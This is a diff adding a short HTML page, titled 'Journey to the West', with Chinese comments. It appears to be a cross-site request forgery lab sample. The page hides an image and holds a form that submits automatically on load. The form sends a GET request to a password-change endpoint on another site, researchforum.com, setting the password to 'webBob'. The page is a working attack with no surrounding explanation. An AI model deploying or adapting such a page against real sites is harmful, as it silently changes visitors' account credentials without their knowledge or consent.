@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+	<body>
+	<h1>Journey to the West</h1>
+	<!--首页西游记图片-->
+	<img style="display:none" src="./xyj.png"/>
+
+	<!—发送GET请求的表单-->
+	<form name="codeForm" method="GET" 
+action="http://www.researchforum.com/ChangeCode.php">
+		<input name="password" value="webBob"/>
+		<input type="text" name="add" value="submit"/>
+	</form>
+	
+	</body>	
+<script>
+	var codeForm = document.getElementsByName("codeForm")[0];
+	codeForm.submit();
+</script>
+</html>
